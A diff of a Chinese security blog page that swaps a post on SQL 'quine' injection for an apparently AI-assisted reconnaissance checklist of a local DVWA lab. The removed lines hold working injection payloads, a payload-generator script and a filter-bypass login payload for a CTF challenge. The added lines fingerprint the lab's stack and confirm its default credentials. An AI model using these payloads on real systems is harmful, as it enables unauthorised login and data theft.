@@ -78,7 +78,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://kivvs.github.io/2026/08/14/sql-quine注入/"/>
+    <link rel="canonical" href="https://kivvs.github.io/2026/09/10/基于ai大模型的辅助渗透和ai边界与角色的察觉-信息收集清单/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -87,16 +87,17 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL quine注入">
-<meta property="og:url" content="https://kivvs.github.io/2026/08/14/SQL-quine%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="基于AI大模型的辅助渗透和AI边界与角色的察觉一">
+<meta property="og:url" content="https://kivvs.github.io/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%B8%85%E5%8D%95/index.html">
 <meta property="og:site_name" content="kivvs">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://kivvs.github.io/images/redefine-og.webp">
-<meta property="article:published_time" content="2026-08-14T09:37:10.000Z">
-<meta property="article:modified_time" content="2026-08-14T09:53:07.193Z">
+<meta property="article:published_time" content="2026-09-10T09:05:03.000Z">
+<meta property="article:modified_time" content="2026-09-10T09:07:09.249Z">
 <meta property="article:author" content="kivvs">
-<meta property="article:tag" content="web">
+<meta property="article:tag" content="AI">
+<meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://kivvs.github.io/images/redefine-og.webp">
     
@@ -110,7 +111,7 @@
     
     <title>
         
-            SQL quine注入 | kivvs
+            基于AI大模型的辅助渗透和AI边界与角色的察觉一 | kivvs
         
     </title>
 
@@ -299,7 +300,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">SQL quine注入</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">基于AI大模型的辅助渗透和AI边界与角色的察觉一</h1>
 			</div>
 			
 		</div>
@@ -320,15 +321,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2026-08-14 17:37:10</span>
-        <span class="mobile">2026-08-14 17:37:10</span>
+        <span class="desktop">2026-09-10 17:05:03</span>
+        <span class="mobile">2026-09-10 17:05:03</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2026-08-14 17:53:07</span>
-            <span class="mobile">2026-08-14 17:53:07</span>
+            <span class="desktop">2026-09-10 17:07:09</span>
+            <span class="mobile">2026-09-10 17:07:09</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -342,7 +343,7 @@
                     
                         
                         <li>
-                            <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>&nbsp;
+                            <a href="/categories/AI%E5%AD%A6%E4%B9%A0/">AI学习</a>&nbsp;
                         </li>
                     
                     
@@ -356,7 +357,11 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/web/">web</a>&nbsp;
+                        <a href="/tags/AI/">AI</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>&nbsp;
                     </li>
                 
             </ul>
@@ -382,82 +387,434 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>&emsp;&emsp;Quine 注入 是一种特殊的 SQL 注入 技术，其核心思想是利用 自生成代码（Quine） 的特性，构造一个 Payload，使得注入的 SQL 代码在执行时能够 自我复制 或 自我生成，也就是输入输出一致，从而绕过限制登录</p>
-<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>&emsp;&emsp;由于需要对输入输出进行强对比，在这里我们需要用到一个比较特殊的函数，replace 函数，语法如下：<br><code>REPLACE(str, from_str, to_str)</code></p>
-<ul>
-<li>str：原始字符串，需要进行替换的字符串。</li>
-<li>from_str：需要被替换的子字符串。</li>
-<li>to_str：替换后的新子字符串。</li>
+			<h1 id="DVWA-信息收集清单（定制版-·-仅侦察-·-已补全）"><a href="#DVWA-信息收集清单（定制版-·-仅侦察-·-已补全）" class="headerlink" title="DVWA 信息收集清单（定制版 · 仅侦察 · 已补全）"></a>DVWA 信息收集清单（定制版 · 仅侦察 · 已补全）</h1><ul>
+<li><strong>目标</strong>：<code>http://localhost/dvwa/</code></li>
+<li><strong>技术栈</strong>：Apache&#x2F;2.4.39 (Win64) + PHP&#x2F;7.3.4 (CGI&#x2F;FastCGI, mod_fcgid) + MySQL&#x2F;MariaDB（库名 <code>dvwa</code>）+ Windows WAMP 环境</li>
+<li><strong>站点身份</strong>：Damn Vulnerable Web Application（DVWA，授权本地靶场，标题自证；版本含 <code>api/authbypass/cryptography/open_redirect</code> 模块，推断 ≥ 1.10）</li>
+<li><strong>生成时间</strong>：2026-09-07 ｜ <strong>补全轮次</strong>：已用 <code>admin/password</code> 登录完成鉴权后侦察</li>
+<li><strong>图例</strong>：<code>[已确认]</code> &#x3D; 已实测命中（只读 GET&#x2F;HEAD&#x2F;登录）；<code>[待验证]</code> &#x3D; 需后续逐项确认；<code>◆</code> &#x3D; 高价值侦察点</li>
+<li><strong>范围红线</strong>：本清单仅含信息收集（目录&#x2F;参数&#x2F;接口&#x2F;技术指纹）。<strong>不含任何利用 payload、不含认证绕过&#x2F;注入&#x2F;命令执行探测</strong>——依用户要求，只做信息收集。</li>
 </ul>
-<p>&emsp;&emsp;语法很简单，如下面这个例子一般会将’aaab’中的’b’替换为’c’.<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://kivvs.github.io/images/quine0.png"
-                     
-                ><br>&emsp;&emsp;同时，这里还有几个常见字符需要我们知道。</p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CHAR(<span class="number">34</span>)=<span class="string">&quot;</span></span><br><span class="line"><span class="string">CHAR(39)=&#x27;</span></span><br><span class="line"><span class="string">CHAR(33)=!</span></span><br></pre></td></tr></table></figure></div>
-<h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>&emsp;&emsp;接下来我们开始构造 quine 语句，先来个简单的语句练练手。</p>
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;);</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://kivvs.github.io/images/quine1.png"
-                     
-                ></p>
-<p>&emsp;&emsp;这里实际上就是将点替换为点，看上去没什么用，对吧。我们接下来再看这个 quine 语句：</p>
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://kivvs.github.io/images/quine2.png"
-                     
-                ><br>&emsp;&emsp;这里，我们用到了 replace 函数的嵌套，语句返回了<code>replace(&quot;.&quot;,char(46),&quot;.&quot;)</code>。从这里我们可以初见一些端倪，发现返回的值不就是原先 replace 函数嵌套内的语句嘛。那么，如果我们再加一层 replace 函数进行嵌套，返回的内容又会怎么样呢？<br>  我们来看看这个语句：</p>
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
-<p>&emsp;&emsp;返回结果如下：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://kivvs.github.io/images/quine3.png"
-                     
-                ><br>&emsp;&emsp;这样看来，我们几乎使得输入输出的内容是一模一样了，但是，依旧还有单双引号的区别。<br>&emsp;&emsp;那么，我们如何才能真正达到我们的目的呢？<br>&emsp;&emsp;当我们这样考虑，如果先将双引号替换为单引号，再用上我们之前的语句，是不是就可以解决这个问题呢？这个想法也很好实现，无非就是再套一层 replace 函数罢了。<br>&emsp;&emsp;所以我们接下来先构造出一个简单的双引号替换单引号的语句：</p>
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(replace(<span class="string">&#x27;&quot;.&quot;&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;);</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://kivvs.github.io/images/quine4.png"
-                     
-                ></p>
-<p>&emsp;&emsp;这里内层的 replace 没有用单引号包裹，说明是先执行内层的 replace ，再执行的外层的 replace，最终返回 <code>&lt;font style=&quot;background-color:rgba(0, 0, 0, 0.06);&quot;&gt;&#39;.&#39;&lt;/font&gt;</code>，至此已经解决的引号不同的问题。<br>&emsp;&emsp;接下来，我们就可以正式开始构造 payload 了：</p>
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
-<p>&emsp;&emsp;为方便理解，我们换个方式写这个 payload：</p>
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">replace(</span><br><span class="line">  replace(</span><br><span class="line">    <span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,</span><br><span class="line">    <span class="type">char</span>(<span class="number">34</span>),</span><br><span class="line">    <span class="type">char</span>(<span class="number">39</span>)</span><br><span class="line">  ),</span><br><span class="line">  <span class="type">char</span>(<span class="number">46</span>),</span><br><span class="line">  <span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
-<p>&emsp;&emsp;第一步，代码会先执行内部 replace 函数，即绿色部分语句，它会将双引号替换为单引号。得到：<br>&emsp;&emsp;&emsp;&emsp;<code>&#39;replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)&#39;</code><br>&emsp;&emsp;然后，我们就可以整体执行最外层 replace 函数，得到：<br>&emsp;&emsp;&emsp;&emsp;<code>replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)</code><br>&emsp;&emsp;最后我们就能得到：</p>
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(&quot;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;)</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://kivvs.github.io/images/quine5.png"
-                     
-                ></p>
-<p>&emsp;&emsp;这一次，我们就会发现输入输出完全一样了。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp;这一套构造流程走下来，基本就已经对 SQL 的 quine 注入有了较为详细的了解。<br>总结一下：</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Quine基本形式：</span><br><span class="line"></span><br><span class="line">replace(replace(‘str’,char(34),char(39)),char(46),‘str’)</span><br><span class="line"></span><br><span class="line">先将str里的双引号替换成单引号，再用str替换str里的.</span><br><span class="line"></span><br><span class="line">str基本形式（可以理解成上面的&quot;.&quot;）</span><br><span class="line"></span><br><span class="line">replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)</span><br><span class="line"></span><br><span class="line">完整的Quine就是Quine基本形式+str基本形式</span><br></pre></td></tr></table></figure></div>
-<p>&emsp;&emsp;这里也从网上找到了一个好用的 payload 构造脚本：</p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sql = <span class="built_in">input</span> (<span class="string">&quot;输入你的sql语句,不用写关键查询的信息  形如 1&#x27;union select #\n&quot;</span>)</span><br><span class="line">sql2 = sql.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">base = <span class="string">&quot;replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)&quot;</span></span><br><span class="line">final = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;--+&quot;</span> <span class="keyword">in</span> string):</span><br><span class="line">        tem = string.split(<span class="string">&quot;--+&quot;</span>)[<span class="number">0</span>] + base + <span class="string">&quot;--+&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;#&quot;</span> <span class="keyword">in</span> string):</span><br><span class="line">        tem = string.split(<span class="string">&quot;#&quot;</span>)[<span class="number">0</span>] + base + <span class="string">&quot;#&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tem</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">string,sql</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;--+&quot;</span> <span class="keyword">in</span> string):</span><br><span class="line">        <span class="keyword">return</span> sql.split(<span class="string">&quot;--+&quot;</span>)[<span class="number">0</span>] + string + <span class="string">&quot;--+&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;#&quot;</span> <span class="keyword">in</span> string):</span><br><span class="line">        <span class="keyword">return</span> sql.split(<span class="string">&quot;#&quot;</span>)[<span class="number">0</span>] + string + <span class="string">&quot;#&quot;</span></span><br><span class="line"></span><br><span class="line">res = patch(base.replace(<span class="string">&quot;.&quot;</span>,add(sql2)),sql).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>).replace(<span class="string">&quot;&#x27;.&#x27;&quot;</span>,<span class="string">&#x27;&quot;.&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://kivvs.github.io/images/quine6.png"
-                     
-                ></p>
-<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><strong>[第五空间 2021]yet_another_mysql_injection</strong></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- /?source --&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;/index.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;账号&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;密码&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> / value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
-<p>&emsp;&emsp;判断 username 是否为 admin，过滤了很多盲注的函数，还过滤了空格，不打盲注，但貌似也有人用盲注打出来了，对传入的 password 进行强比较，直接用 quine 注入，用上面的脚本构造出payload</p>
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,3 #</span></span><br></pre></td></tr></table></figure></div>
-<p>&emsp;&emsp;构造 payload 为：</p>
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure></div>
-
-
-<p>参考文档：<br><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17210" >https://xz.aliyun.com/news/17210<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2287111" >https://cloud.tencent.com/developer/article/2287111<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<hr>
+<h2 id="A-技术指纹（Tech-Fingerprint）"><a href="#A-技术指纹（Tech-Fingerprint）" class="headerlink" title="A. 技术指纹（Tech Fingerprint）"></a>A. 技术指纹（Tech Fingerprint）</h2><ul>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> Web 应用：<strong>DVWA</strong>（登录页 <code>&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA)&lt;/title&gt;</code>）</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> Web 服务器：<strong>Apache&#x2F;2.4.39 (Win64)</strong>，含 <code>OpenSSL/1.1.1b</code>、<code>mod_fcgid/2.3.9a</code>、<code>mod_log_rotate/1.02</code>（Windows WAMP&#x2F;XAMPP 类宿主）</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> 后端语言 &#x2F; 运行模式：<strong>PHP&#x2F;7.3.4</strong>，<code>Server API = CGI/FastCGI</code>（与 <code>mod_fcgid</code> 一致）</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> 数据库：<strong>MySQL &#x2F; MariaDB</strong>，库名 <strong><code>dvwa</code></strong>（<code>/setup.php</code> 显示 “Installed database already exists”）</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> PHP 扩展：<code>MySQLi</code>、<code>mysqlnd</code>、<code>pdo_mysql</code>、<code>GD</code>（来自 <code>/phpinfo.php</code>）</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> 安全级别机制：四级 <code>Low / Medium / High / Impossible</code>（<code>/security.php</code> 选项确认）；实测默认下发 Cookie <code>security=impossible</code></li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> 会话机制：<code>PHPSESSID</code>（HttpOnly + SameSite&#x3D;Strict，Max-Age&#x3D;86400）</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> 认证：默认账密 <strong><code>admin / password</code></strong> 登录成功（响应 <code>logged in as &#39;admin&#39;</code>，<code>/index.php</code> 200）</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> 缓存策略：全站 <code>Cache-Control: no-store, no-cache, must-revalidate</code> + <code>Pragma: no-cache</code></li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> 登录防护：登录表单含反 CSRF 隐藏字段 <code>user_token</code>（单引号属性），校验依赖会话，未带会话会被拒</li>
+<li><input disabled="" type="checkbox"> <code>[待验证]</code> PHP <code>display_errors</code> 是否开启（DVWA 默认常开，便于信息收集；待 <code>/phpinfo.php</code> 确认 <code>display_errors=On</code>）</li>
+</ul>
+<hr>
+<h2 id="B-目录与静态资源"><a href="#B-目录与静态资源" class="headerlink" title="B. 目录与静态资源"></a>B. 目录与静态资源</h2><table>
+<thead>
+<tr>
+<th>路径</th>
+<th>方法</th>
+<th>状态</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/dvwa/</code></td>
+<td>GET</td>
+<td>302 → <code>login.php</code></td>
+<td>未登录跳转登录</td>
+</tr>
+<tr>
+<td><code>/dvwa/login.php</code></td>
+<td>GET&#x2F;POST</td>
+<td>200</td>
+<td>登录页（字段 <code>username</code>&#x2F;<code>password</code>&#x2F;<code>Login</code>&#x2F;<code>user_token</code>）</td>
+</tr>
+<tr>
+<td><code>/dvwa/index.php</code></td>
+<td>GET</td>
+<td>200（登录后）</td>
+<td>主控制台，含全部漏洞模块导航</td>
+</tr>
+<tr>
+<td><code>/dvwa/setup.php</code></td>
+<td>GET</td>
+<td>200</td>
+<td>◆ 数据库安装页（已装：<code>dvwa</code> 库存在）</td>
+</tr>
+<tr>
+<td><code>/dvwa/about.php</code></td>
+<td>GET</td>
+<td>200</td>
+<td>公开说明页</td>
+</tr>
+<tr>
+<td><code>/dvwa/instructions.php</code></td>
+<td>GET</td>
+<td>200</td>
+<td>公开使用说明</td>
+</tr>
+<tr>
+<td><code>/dvwa/security.php</code></td>
+<td>GET</td>
+<td>200（登录后）</td>
+<td>安全级别切换（Low&#x2F;Medium&#x2F;High&#x2F;Impossible）</td>
+</tr>
